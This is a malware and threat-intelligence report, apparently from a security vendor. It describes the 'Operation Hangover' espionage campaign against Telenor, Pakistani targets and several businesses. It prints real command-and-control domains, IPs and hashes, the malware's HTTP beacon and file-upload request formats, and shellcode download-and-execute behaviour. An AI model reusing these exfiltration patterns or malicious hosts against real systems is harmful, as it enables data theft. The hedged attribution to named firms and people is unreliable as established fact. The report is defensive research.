Executive summary
In this report we detail a cyberattack infrastructure that appears to be Indian in origin. This infrastructure
has been in operation for at least three years, more likely close to four years.
The purpose of this framework seems predominantly to be a platform for surveillance against targets of
national security interest (such as Pakistan), but we will also show how it has been used for industrial
espionage against the Norwegian telecom corporation Telenor and other civilian corporations.

The name, “Operation Hangover”, was derived from the name of one of the most frequently used malwares. The project debug
path is often visible inside executable files belonging to this family.

None of the information contained in the following report is intended to implicate any
individual or entity, or suggest inappropriate activity by any individual or entity
mentioned.

Background
On Sunday March 17th 2013 the Norwegian newspaper Aftenposten reported that the
telecommunications giant Telenor had filed a case with Norwegian criminal police (“KRIPOS”) over what
was perceived as an unlawful intrusion into their computer network. The infection was reported to have
been conducted via “spear phishing” emails sent to people in the upper tiers of management.
Initially, we had no information or visibility into this case. However, after some time Norwegian CERT
(NorCERT) shared some data from the event, which included md5 hashes of malicious files and
information about which Command and Control servers were used.
However, the data we were given acted as a starting point for more data mining, and within a short
period of time it became obvious that we were seeing a previously unknown and very extensive
infrastructure for targeted attacks. This paper is the result of the ensuing investigation.

Timeframe
The samples we have uncovered seem to have been created from approximately September 2010 until
the present day. It appears 2012 was a very active year for this group, which saw escalation not only in
numbers of created malware files but also in targets. There is no sign that the attacks will slow down in
2013, as we see new attacks continuously.

Acknowledgments
We would like to thank NorCERT, the Norwegian National Security Authority, Telenor and Telenor SOC
for their assistance and cooperation during the investigation of this case. We would also like to thank
ESET for graciously sharing information they were in possession of, and finally we would like to express
our gratitude to the people who created our database and analysis systems. These systems enable us to
do the data correlation needed to find needles in haystacks, so their creators own a large part of this
paper as well.

Terms used
C&C, C2, CC: Command- and Control server. Typically used about the computer the malware connects
to in order to report status.
Drop:

The online location where malware delivers stolen information.

FUD:
One meaning of this acronym is “Fear, Uncertainty and Doubt”, but in the malware
underground FUD means Fully UnDetectable, i.e. the program is not detected by antivirus tools.
MD5:
A so-called hash – i.e. a number calculated on the basis of data that identifies these with
high confidence. MD5’s in this paper are used to identify files.
RTF:

Rich Text Format, a document format

SFX:
Self-extracting. Executable programs that are also archives, and which extract and
sometimes execute the archive content when run.
Sinkholing:
A technique of re-registering a domain that has previously been used for malicious
purposes. By doing this, machines that are still infected connect to our computer instead of the
attacker’s, and we can log the connection attempts.
Spear phishing: To send emails with malicious content (attachments, links, or fraudulent messages) to
specific persons of particular interest.
Zero day exploits: Program code to attack software vulnerabilities for which there is no patch.

Telenor intrusion
Initially we had no knowledge of the malware samples involved in the attack on Telenor. However, some
days after the attack we received MD5 hashes of the samples used. We only found two of these samples
in our own datasets, but we later directly received copies of most other samples connected with the case
(Appendix A).
The initial spear phishing mail contained two files as attachments – a document named “220113.doc”,
and an executable file “few important operational documents.doc.exe”.
(MD5 bd52237db47ba7515b2b7220ca64704e).
This was a selfextracting (SFX) ZIP archive that contained two files, as shown below.

When run, the installer will execute the included “conhosts.exe” file and open the decoy document
“legal operations.doc”. “legal operations.doc”and “220113.doc” also included in the mail are identical
save for their size, and are actually specially crafted RTF files designed to trigger a software vulnerability
(CVE-2012-0158) in Microsoft Common Controls, typically triggered in Microsoft Word. If the
vulnerability is triggered, embedded code in the document will be run. This code is encrypted, but after
decryption its real purpose becomes visible:

The file “windwn.exe” is downloaded and executed by this mechanism.

Fig. The behaviour of windwn.exe in Norman Malware Analyzer G2. The persistence mechanism, VBScript execution and data
exfiltration is enough to trigger alerts.

The files conhosts.exe (MD5 02d6519b0330a34b72290845e7ed16ab) and windwn.exe (MD5
bfd2529e09932ac6ca18c3aaff55bd79) are both minimally obfuscated Visual Basic executables. They
connect to the Command and Control server wreckmove.org (188.240.47.145) via HTTP on port 80, using
a peculiar and recognizable pattern:
GET
/flaws/snwd.php?tp=1&tg=[ID]&tv=Error[]&ts=[PLATFORM]&mt=[account]&tr=[NoFiles]&Y1Y5F2
HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR
2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)
Host: wreckmove.org
Connection: Keep-Alive

Other samples found connected to the case were Delphi information stealers (some highly targeted,
down to individual username), file splitter tools, C++ information stealers (keyloggers, screen grabbers
and file harvesters), and various other malware written in Visual Basic.
The following C&C domains/IP addresses were observed used in the attack:

Telenor epilogue
On the 3rd of April the attackers created another attack package and placed it on the URL
http://mail.telenor.no-cookieauth.dll-getlogon-reason-0.formdir-1-curl-z2fowaz2f.infocardiology.biz/
01084204_Telenor_New_Satellite_Client_Agreement_30032013.zip.
The package is quite similar to the first, though the decoy document is this time a Powerpoint
presentation, “01084204_Telenor_New_Satellite_Client_Agreement_30032013.ppt”. This is an
apparently legitimate Telenor draft written in 2002 using a Norwegian PowerPoint installation.
The included trojan downloader connects this time back to the domain torqspot.org.
The attackers also created the subdomain
internet-security-suite-review.toptenreviews.com.infocardiology.biz, a spoof of the real
toptenreviews.com site. On this site there’s what appears to be an installer for the Bitdefender antivirus
product (bitdefender_tsecurity.zip, md5 62b702a15a762692eda296b0aea270f9), but the zip file contains
both a real installer and a Visual Basic trojan identical to the one used against Telenor.
The Telenor-related attack seems not to be over.

Case expansion through related files
The behaviour pattern and the file structure of known files made it possible to search internal and public
databases for similar cases. The large amount of new malware being created makes it infeasible to
conduct malware-related investigations of any scale without strong database support. In our case, we
preserve the behavioural information of all files processed by our internal bank of Norman MAG2
automatic analysis systems.

Searching internal databases for behavioural similarities: In this case, the particular VB script execution, but there’s a wealth of
attributes we can cluster by.

There are also several public and commercial databases available for additional data mining, and Google
is invaluable. The amount of malware we found through this was surprisingly large, and it became clear
that the Telenor intrusion was not a single attack but part of a continuous effort to attack and
compromise governments and corporations around the world.

While investigating the extra cases we identified, we accidentally discovered that a number of their C&C
servers contained world readable folders. We were able to navigate into these and secure the data
stored there.

The data contained in these folders were mainly connection logs, keylogs and other uploaded data from
computers affected with malware. Many of the collected logs were from automated analysis systems
belonging to security companies, but not all.
An important find we did on these servers were additional malicious executables, probably meant to be
served to infected users. Some of these executables were digitally signed with a certificate which was
revoked in 2011:
Technical and Commercial Consulting Pvt. Ltd.
VeriSign Class 3 Code Signing 2010 CA
Serial number: 4bf1d68e926e2dd8966008c44f95ea1c
Revoked Nov 24th 2011

Searching our certificate databases we found a large number of other executables similarly signed, none
of which were found to be innocent applications.

Case expansion through domain usage and registrations
In almost all cases, the domains registered by the attackers are “privacy protected”. This means that the
registrant has paid the domain registrar to withhold identity information related to the registration. This
is done almost to perfection. Another feature is that almost all websites belonging to this attacker has
their robots.txt set to “disallow” to stop them from being crawled.
However, by searching historical IP data for the IP addresses of domains known to be involved we found
a number of other domains likely belonging to the same infrastructure. These domains were then further
verified against malware samples to ascertain valid connection to attackers. Some care needs to be taken
when working with IP addresses, as there are possibilities of false correlations on, for example, domain
parking IP addresses, sinkholes and webhosting servers.

Operation Hangover: Unveiling an Indian Cyberattack Infrastructure

Additional data may be gleaned by querying the IP addresses themselves. Many have set up a default
ESMTP (mail) server on port 587/tcp, which responds with a configured banner. For example, the domain
onlinestoreapp.net (used by malware MD5 a7b5fce4390629f1756eb25901dbe105) resolved to the IP
address 37.59.231.161, and this happens when connecting to that IP on ESMTP:
$ telnet 37.59.231.161 587
Trying 37.59.231.161...
Connected to 37.59.231.161.
Escape character is '^]'.
220 server.enlighten-energy.org ESMTP Exim 4.80.1 Sat, 23 Mar 2013 16:44:44 -0400

enlighten-energy.org is another of the known bad domains used against Telenor.

All of this enabled us to draw a domain map over the infrastructure (next page). This map is probably
larger than shown here; there might be domains owned by the attackers that are not plotted on this map
because we could not prove they were malicious, and many domains we have not found yet. Conversely,
many of the domains plotted were used in attacks years ago and may never be again.

Above: Domain map of the attack infrastructure. Yellow and orange nodes constitute domains, where the orange have
been verified malicious and yellow are likely malicious. Blue nodes are IP addresses, and purple are autonomous
systems (AS). Green nodes are domains that are not part of any attack pattern, but are interesting in this context. Red
nodes show connections to known or likely attacks.

Exploits
Whereas other targeted attack actors often rely extensively on the use of software exploits to plant their
malware, this is rarely done by this attack group. As far as we can tell they are only using known
vulnerabilities; no zero day attacks.

Documents
The first exploit we observed was included in the RTF files used in the Telenor attack. The exploit in
question was CVE-2012-0158, a very common vulnerability to exploit.
The actual document is binary very similar to other documents (51ee31f234db61b488647915f8d7d4c8,
00978e4b81ac577f328d6add75d0890e, 17a31d1075ebce41ba48a9efacb79d28...) which have been
used in other targeted attacks by these threat actors.
The shellcode contains a date check, which means it will stop working after a certain date. In the
Telenor case, the date was February 16th 2013, and in the most recent variations the timeout date is set
to May 21nd 2013. If the exploit is triggered before the timeout date the shellcode does two different
things:
•
•

•

Posts system info (machinename, timezone, ID, running processes) to a PHP script residing on
the website random123.site11.com.
Downloads and executes an executable from remote sites. We have seen softmini.net,
www.infocardiology.biz, www.getmedia.us, www.technopenta.org, and autowidge.org used for
this.
The executables downloaded have usually themselves been downloaders. In a couple of cases
we have observed final payload to be Dark Comet, a well-known backdoor trojan, but unusual
for this group to use.

Web
When we investigated the attacker domain structure we found more exploit code. This time it was
implemented as a script in the main web page of the domain you-post.net. The exploit is this time CVE2012-4792, an Internet Explorer vulnerability. When it triggers it downloads and runs a malicious
executable from the domain softmini.net; also the domain used by two of the three documents
mentioned above.
Softmini.net seems to be a hub for exploitcode; its subdomain get.adobe.flash.softmini.net contains an
active Java exploit (CVE-2012-0422) which attempts to install the same trojan as the IE exploit above.

Operation Hangover: Unveiling an Indian Cyberattack Infrastructure

14

The Smackdown downloaders
Most of the first stage malware we’ve seen used in attacks are variants of Smackdown, a large family of
Visual Basic downloaders which for the most part seem to be written by a person calling himself “Yash”
or “Yashu”. These have evolved over time and are using different levels of obfuscation on text strings.
Typically the trojan begins by uploading system information to a PHP script on the C&C server. The
attacker can decide separately which infected machine should receive additional malware. The second
stage malware is usually Hanove but other malware families are also used.

garbage ‘%’ characters.

Operation Hangover: Unveiling an Indian Cyberattack Infrastructure

15

The HangOver malware, aka Hanove
The second stage malware are often variants of HangOver, information stealers written in C++. They
appear to be written over a common framework as many internal functions are identical, but overall
functionality can vary quite a bit from one subtype to another. The first versions of these may have been
based on code from an innocent backup utility as the word “backup” is often present.
Hanove Uploaders recursively scan folders looking for files to upload. What kind of files they look for are
usually defined in resources as an extension list, and these lists vary. Here are a few examples:
*.doc;*.xlxs;*.docx;*.rtf
*.doc;*.xlxs;*.docx;*.rtf;*.jpg;*.ppt;*.pps;*.pdf;*.xlx
*.doc;*.xlsx;*.docx;*.rtf;*.pdf;*.xls;*.ppt;*.txt;*.inp;*.kmz;*.pps;*.uti
Hanove keyloggers set up keyboard hooks or polls to capture keypresses and log these to a text file.
Some variants capture other data as well, such as clipboard content, screenshots, titles of open windows
and content of browser edit fields. Timed events are set up to upload the data to the remote server.
The stolen data are uploaded to remote servers by FTP or HTTP.
A typical HTTP request looks like this:
POST /up.php HTTP/1.1
Content-Type: multipart/form-data; boundary=F39D45E70395ABFB8D8D2BFFC8BBD152
User-Agent: EMSFRTCBVD
Host: remotedomain.com
Content-Length: 5050
Cache-Control: no-cache
--F39D45E70395ABFB8D8D2BFFC8BBD152
Content-Disposition: form-data; name="uploaddir"
subfolder/%username-machinename%/C/
--F39D45E70395ABFB8D8D2BFFC8BBD152

UserAgent strings vary between versions. The following have been seen in connection with this family:
EMSCBVDFRT, EMSFRTCBVD, FMBVDFRESCT, DSMBVCTFRE, MBESCVDFRT, MBVDFRESCT
TCBFRVDEMS, DEMOMAKE, DEMO, UPHTTP, sendFile

Boundary parameters vary between versions. The following have been seen in connection with this
family:
F39D45E70395ABFB8D8D2BFFC8BBD152,
FFF3F395A90B452BB8BEDC878DDBD152,

8765F3F395A90B452BB8BEDC878
F12BDC94490B452AA8AEDC878DCBD187

String content consists of some strings largely static between variants, and some that vary. Non-static
strings are browser UserAgent strings, MIME boundary tags, mutexes, domain names, paths, and registry
keys, which also may be obfuscated by being fragmented. Many Hanove variants use a simple rotating
encoding scheme to hide the interesting strings. For example, the domain “wearwellgarments.eu” is
hidden as “xfbsxfmmhbsnfout/fv” and the word “php” becomes “qiq”.
Different variants are frequently given internal names, visible through debug paths included in the
binary. Such internal names used include “HangOver”, “Ron”, ”Dragonball”, ”Tourist”, ”Klogger”,
“FirstBlood” and “Babylon”.

There are several other malwares and tools in use. See appendix C for more indicators.

Target selection
We have direct knowledge of only one attack – the one against Telenor. During this investigation we
have obtained malware samples and decoy documents that have provided indications as to whom else
would be in the target groups. We have observed the usage of peculiar domain names that are
remarkably similar to existing legitimate domains. We have also obtained sinkhole data for a number of
domains in question and found open folders with stolen userdata in them; enough to identify targets
down to IP and machine name/domain level. This showed a geographical distribution where Pakistan
was the most affected in volume, but also showed a multitude of other countries being represented.

Note that these data should be taken as indicative only. IP counts are misleading for many reasons. One
machine can generate many IP addresses, and some IP addresses are probably lab machines. However,
the indication that Pakistan is the most prevalent target seems solid.
In the following pages we’ve highlighted some of the files we have seen used to attack organizations in
different countries. As can be seen from the examples the attackers have gone to great lengths to make
the social engineering aspect as credible and applicable as possible.

Operation Hangover: Unveiling an Indian Cyberattack Infrastructure

18

Pakistan
The most obvious target seems to be Pakistan. As is visible above, computers in Pakistan are by far the
most active in connecting to malicious domains.
We found logs in the open drop folders that contained suggestive data, such as this snippet from a 2012
log entry (subdomain redacted):
Host Name:
Registered Owner:
Time Zone:
Domain:

PC-PS2CHAIRMAN
admin
(GMT+05:00) Islamabad, Karachi
****.gov.pk

Sinkhole-logged HTTP requests are also informative, such as this seemingly from a Pakistani embassy:
“GET /sdata/shopx.php?fol=EMBASSYOFPAKIST-Embassy%20of%20Pakistan.....”
Decoy files tailored towards Pakistan revolve around the ongoing conflicts in the region, regional culture
and religious matters.

China
China is another country which apparently has been targeted to some extent.
For example, we found a data dump and keylog seemingly harvested from a computer belonging to a
Chinese academic institution. This dump was generated in July 2012 and contains Word documents,
PowerPoint presentations and images.

Uploaded archives of harvested data.

Decoys are also present, but not in the amount as is seen against Pakistani targets.

sentence. Language is simplified Chinese; likely mainland China.

The Khalistan movement
This is a political secessionist movement aiming to create a sovereign Sikh nation in the region of Punjab
in India. Violent episodes between supporters of the Khalistan movement and government forces have
occurred through history since the movement’s creation in 1971.
Examples of malware apparently aimed at the movement are md5’s
a4a2019717ce5a7d7daec8f2e1cb29f8 and f70a54aacde816cb9e9db9e9263db4aa. The former appears
to be this file: http://f00dlover.info/Khalistan/Victims_want_Sajjan_Kumar_punished.doc.zip

It is interesting to note that f00dlover.info has historically shared the IP address 173.236.24.254 with
many other domains belonging to this infrastructure – for example the domain researcherzone.net
which was used in the Telenor intrusion. There are also a number of domains with active web pages
that used to exist on this IP; for example khalistancalling.com. Khalistancalling.com has since moved on
to another bad IP (46.182.104.83) and must be considered owned by the attackers.

The Nagaland movement
The Nagaland (or Nagalim) movement is another secessionist group aiming to create a sovereign
homeland for the Naga people living in North-Eastern India and North-Western Burma. We have seen at
least two attacks apparently aimed at them.
A sample from 2010, md5 168f2c46e15c9ce0ba6e698a34a6769e, showed a scanned document which
appears to be a letter from the “President of Nagalim”.

The malware sample also installed an executable which in turn connected back to the domain
zeusagency.org on the IP 176.31.65.124. Zeusagency.org has hosted different malware; one
(3105b020e2bd43924404bc4e3940191b) connected to fistoffury.net on the IP 176.31.65.126.
The IP range 176.31.65.124 - 176.31.65.127 contains a series of domains used by Gimwlog and Auspo
malwares. These are somewhat different from the standard Hanove series, though functionality is
roughly equivalent.

Industrial espionage
While the Telenor case was most likely industrial espionage, we were initially unaware of other “nonstrategic/political” targets by this attack group, but during our research we discovered several related
attack files that were clearly targeting businesses. As can be seen in the example below, the social
engineering aspects are more related to business content. We want to emphasize that except in the case
of BUMI PLC, we have no information to suggest that any of the organizations named in the following
pages have been compromised. However, the available information strongly indicates that they were
targets of interests for the attackers.
Likely target: Eurasian Natural Resources Corporation (ENRC)
This company which is headquartered in London has operations in multiple countries, notably in
Kazakhstan. The following malwares appear to be aimed at ENRC.
ENRC__DEBT__INVESTORS__2012__for__your__Reference.exe
(MD5 e40205cba4e84a47b7c7419ab6d77322)

Gerhard Ammann is also affiliated with ENRC.

Known target: Bumi PLC, Indonesia
When searching for known instances of domains belonging to the attack infrastructure, we found a
published incident report made by Context Information Security (2). This report details how the
Chairman of Bumi PLC, Mr Samin Tan, had been exposed to a spear-phishing attack in July 2012. Bumi is
an international mining group listed on the London Stock Exchange.

Source: Context Information Security.

Both the domains mentioned in this report have been connected to the attack group investigated. For
example, the malware executable “dua2alhycox12.exe” (c94267ba9c92f241379cdceed58777dc)
connects to hycoxcable.com, which anoniemvolmacht.com historically acted as name server for. The
latter domain has also shared IP with the malicious domain chronicleserv.org.

Likely target: Porsche Informatik
A malware using the name “webmailapp.exe” (22a3a1d5a89866a81152cd2fc98cd6e2) is a self-extracting
archive containing several files, among them a batch file opening a shortened URL pointing to Porsche
Holding’s webmail front in Austria.
Target must be assumed to be persons affiliated with Porsche. Again, we have no information as to
whether any intrusion has occurred.

The webmail front of Porsche in Austria.

27

Possible target: Restaurant industry
It appears unlikely that the restaurant and food industry should be the victim of targeted attacks.
However, that’s how it appears. One indicator is the decoy file below, taken from the malicious
executable “Horsemeat_scandal_another_Irish_company_suspends_burger_production.exe“
(f52154ae1366ae889d0783730040ea85).

Guardian article about a horsemeat scandal in Ireland. Target is unknown, but file was first submitted to the VirusTotal scan
service from Great Britain.

Another indicator is the use of certain domain names, like the malicious bluebirdrestaurant.co.uk.infocardiology.biz vs the legitimate bluebird-restaurant.co.uk.
The latter is a restaurant in Chelsea, UK.

28

Likely target: Chicago Mercantile Exchange
While investigating the malicious domain web-mail-services.info, we found a number of other domains
that had shared the IP address 188.95.48.99 with it. One of these domains was cmegroups.net, a spoof
of cmegroup.com; the domain belonging to Chicago Mercantile Exchange. CME is the world's largest
futures exchange company (3).
An entry on WIPO (4), the UN arbitration body for domain name disputes, shows that a complaint
regarding this domain name was leveled by CME against PrivacyProtect.org in 2012. The complaint was
not disputed, and domain transferred to CME. However, the most interesting information is found in the
case details.

An interesting question is of course whether there were any attachments to this mail.

Other suggestive domain names that have been used include:
server721-hans.de-nservers.de.continuelogs.info vs. server721-han.de-nserver.de:
The latter is the mail server for several German businesses, for example restaurants.
www.alintiqad-newsonline.blogspot.com.continuelogs.info vs www.alintiqad.com:
The latter is a Lebanese newspaper in Arabic.
account.istpumpenunddosiertechnik.de.continuelogs.info vs istpumpenunddosiertechnik.de:
The latter is a German producer of pumps for high-viscosity fluids.
deltaairlines.com.config.services.data.sesion.24s.digitalapp.org.evitalcare.org vs deltaairlines.com:
Delta Airlines.
mail.telenor.no-cookieauth.dll-getlogon-reason-0.formdir-1-curl-z2fowaz2f.infocardiology.biz vs
mail.telenor.no: Telenor
lynberrg.com vs lynberg.com: The latter belongs to Lynberg & Watkins, a US-based law firm.
mail.carmel.us.exchweb.bin.auth.owalogon.asp.serviceaccountloginservicemail.info vs
mail.carmel.us: The latter is the webmail address of Carmel&Carmel, a US-based law firm.
armordesigns.com.webmail-login.php.web-mail-services.info vs armordesigns.com:
The latter is a US-based manufacturer of composite materials for armor:

We do not know (yet) what purpose all these domains have, but it’s hard to imagine that the name
spoofing is done by anything but malicious intent; it is a common tactic in targeted attacks.

Attribution
The continued targeting of Pakistani interests and origins suggested that the attacker was of Indian
origin.

Project and debug paths
Curiously, many of the executables we uncovered from related cases contained cleartext project and
debug path strings (see Appendix C for full list). It is not very common to find malware with debug paths,
but these particular threat actors did not seem to mind leaving such telltale signs, or maybe they were
unaware of their presence. These paths gave more indicators that the attackers were Indian. First, many
of the Visual Basic keyloggers contained the name “Yash”, which might be an abbreviation for several
Indian names. The trojans used against Telenor did not contain any such person name, but the Visual
Basic project name is clearly related to others:
Telenor case (02d6519b0330a34b72290845e7ed16ab, bfd2529e09932ac6ca18c3aaff55bd79)
“C:\miNaPro.vbp”
Related cases (4ad80ff251e92004f56bb1b531175a49, 3d6a8b2df08443c2aa4b6a07a9b55b16)
“D:\YASH\PRO\MY\DELIVERED\2012\DOWNLOADERS\compiled\NewSmack(sep2012)\miNaPro.vbp”
This similarity is not coincidental; these trojans are based on the same code and exhibit similar
behaviour.
This and other text strings we initially saw gave further hints towards Indian attackers.
R:\payloads\ita nagar\Uploader\HangOver 1.5.7 (Startup)\HangOver 1.5.7 (Startup)\Release\Http_t.pdb
C:\Users\neeru rana\Desktop\Klogger- 30 may\Klogger- 30 may\Release\Klogger.pdb
C:\Users\Yash\Desktop\New folder\HangOver 1.5.7 (Startup) uploader\Release\Http_t.pdb

Operation Hangover: Unveiling an Indian Cyberattack Infrastructure

31

A managed environment
The project paths also give a rare glimpse into something we almost never see – a managed malware
creation environment, where multiple developers are tasked with specific malware deliverances.
This is visible in the way the projects themselves are organized:
...Desktop\Feb 2012\kmail(httpform1.1) ...
...May Payload\new keylogger\Flashdance1.0.2\...
...\Monthly Task\August 2011\USB Prop\...
...\Sept 2012\Keylogger\Release\...

...\final project backup\complete task of ad downloader & usb grabber&uploader\...
..D:\YASH\PRO\MY\DELIVERED\2012\DOWNLOADERS\compiled\..
There are many diverging project paths which points towards different persons working on separate
subprojects, but apparently not using a centralized source control system. The projects seem to be
delegated into tasks, of which some seem to follow a monthly cycle. There are hints at team structures,
like the string “VB Team Matrix Production” found in a sample (fa6d2483f766f8431b6c0a8c78178d48),
an indication that a separate team works with Visual Basic development. Some series of malware contain
strings like “delivered”, which, together with the loose project structures may indicate that development
work is being outsourced.

Operation Hangover: Unveiling an Indian Cyberattack Infrastructure

32

The word “Appin”.

In a great number of isolated cases and contexts, the word “Appin” shows up and there seems to be
some connection with the Indian security company called Appin Security Group. By this, we are not
implicating or suggesting inappropriate activity by Appin. Maybe someone has tried to hurt Appin by
falsifying evidence to implicate them. Maybe some rogue agent within Appin Security Group is involved,
or maybe there are other explanations. Getting to the bottom of that is beyond our visibility.

For example, the strings “Appin”, “AppinSecurityGroup”, and “Matrix” are frequently found inside
executables.
One example of this peculiarity is debug paths inside malware files:
C:\BNaga\backup_28_09_2010\threads tut\pen-backup\BB_FUD_23\Copy of client\ Copy of
client\appinbot_1.2_120308\Build\Win32\Release\appinclient.pdb

Build\Win32\Release\appinclient.pdb
D:\Projects\Elance\AppInSecurityGroup\FtpBackup\Release\Backup.pdb
One should note that anyone can add or change such text strings.

Domain registrations
As mentioned, the privacy-protection of domain registrations is almost perfect, but only almost. There
are a large number of domains used, and a few of these have been suspended and lost their privacy
protection. For example, the following malicious domains all used the same registration information
NITR0RAC3.COM, VALL3Y.COM, S3RV1C3S.NET, GAUZPIE.COM, BLUECREAMS.COM:

Identical registration information is also used for other domains that seem unrelated to the attack
infrastructure, like hackerscouncil.com which May 12th 2011 had the following entry (source:
gwebtools.com).

ThreatExpert analysis service October 28th 2010, at which time the domain was operational and accepted
uploads from the malware (6). Three days later, October 31st 2010, the domain got suspended, which
removed its privacy protection:

it was documented as download domain for several trojans (5). It was suspended Apr 18th 2011 and then
displayed the already mentioned Prakash Jain as registrant.

Another example is the domain zerodayexploits.org. This domain has a history of resolving to a series of
malicious IP addresses used for malware attacks (173.236.24.254, 8.22.200.44). This web site which
offers bounties for zeroday exploits, claims to be founded by “Appin Morpheus” and powered by Appin.

Also the live behaviour of some domains shows the word Appin. The malicious domains alr3ady.net,
wearwellgarments.eu, ezservicecenter.org, secuina.net, go-jobs.net, shoperstock.com and
maxtourguide.info inhabit the IP space 178.32.75.192 - 178.32.75.197. All these IP’s return a

Other interesting indicators were found when we examined the domain softservices.org; a domain which
has held several of the known malicious IP addresses used by this group (46.182.104.83, 94.185.81.153,
89.207.135.242). However, even if the domain was obviously connected, we could find no malware that
used it. Instead, we found this forum post on the Nokia developer forum:

Developer username redacted.

The interesting bit was found further down this thread, where the developer posted a snippet of source
code:

This piece of code appears used for uploading mobile data like IMEI number to softservices.org.

We then found the apparent developer’s profile on Elance, an online employment service for freelance
programmers.

37

The developer’s CV on Elance (name redacted).

Based on this we suspect that there are or have been projects to develop mobile malware by this group,
even if we have not found any related mobile malware in our databases.

Mantra Tech Ventures and INNEFU
Mantra Tech Ventures is the registration service for several of the malicious domains that have been in
use. The service first came to our attention because it was used for registering the Command & Control
domains cobrapub.com, mymyntra.net, and n00b4u.com. In addition, Mantra Tech Ventures owns
abhedya.net, which seems to be a name server service for domains registered by them. Abhedya has
been used by several sites in the attack infrastructure like currentnewsstore.com, crvhostia.net,
webmicrosoftupdate.net and fuzzyfile.net.
Abhedya is also visible in the PIEGAUZ.NET name server history:

The domain appinonline.com is also hosted on the cloud service mantragrid.com, a Mantra Ventures
company.
There is another interesting detail: We found a connection log on one of the open drop folders earlier
mentioned. This log folder was named “test” and data in it was uploaded from an IP belonging to the
French provider OVH. The log contained data from a lab test PC whose registered owner was “innefu”.

Operation Hangover: Unveiling an Indian Cyberattack Infrastructure

39

There is indeed an Indian information security consulting group named Innefu. The domain innefu.com
was registered by the same Arun Bansal. Innefu also hires “ethical hackers”:

It is possible that Mantra Tech Ventures hosted the malicious sites by coincidence, and it is possible that
INNEFU (if indeed the mentioned log came from them) just happened to run the malware in an
automatic test system like many other security vendors do as part of their malware analysis research.

Conclusion
When researching the attack against Telenor we were able to uncover that actors apparently operating
from India have been conducting attacks against business, government and political organizations
around the world for over three years.
There are also indicators of involvement by private sector companies or persons connected to these,
though these data are circumstantial and may be attempts to implicate said companies.
We have no visibility into whether the attacks were done on behalf of others, and if so who
commissioned them or whether all attacks were commissioned by one entity or by several.
The methods used were primarily based on different social engineering tactics rather than exploits, but
history has shown that social engineering based attacks can be very successful, confirmed once again by
looking at the data we have been able to uncover.
Organizations today need to realize that it’s not a matter of whether they will be compromised but a
question of when and have a plan in place for how to deal with those compromises.
